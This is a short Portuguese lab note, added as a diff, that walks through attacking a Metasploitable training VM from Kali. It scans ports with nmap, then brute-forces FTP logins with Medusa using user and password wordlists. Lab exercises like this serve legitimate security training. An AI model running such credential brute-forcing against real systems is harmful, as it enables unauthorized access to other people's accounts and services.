@@ -1,0 +1,17 @@
+1-  Logar no Metasplote com as senhas padrão
+
+2 - Descobrindo o <IP> da máquina -  comando ip a 
+
+3 - Logar no kaly com as senhas padrão
+
+4 - Localizando vulnerabilidade por meio do NMAP: nmap -sv - p 21,22,80,445,139 <IP>
+
+5 - Verificando se o FTP está disponível: FTP <IP>
+
+6 - Executando o Medusa: medusa -h <IP> -U users.txt -P pass.txt -M ftp -t 6
+-t significa o número de threads a serem utilizadas para o ataque
+
+Ver as messagens de sucesso 
+
+7 - Acessando o FTP com a credencial que deu sucesso: FTP <IP>
+
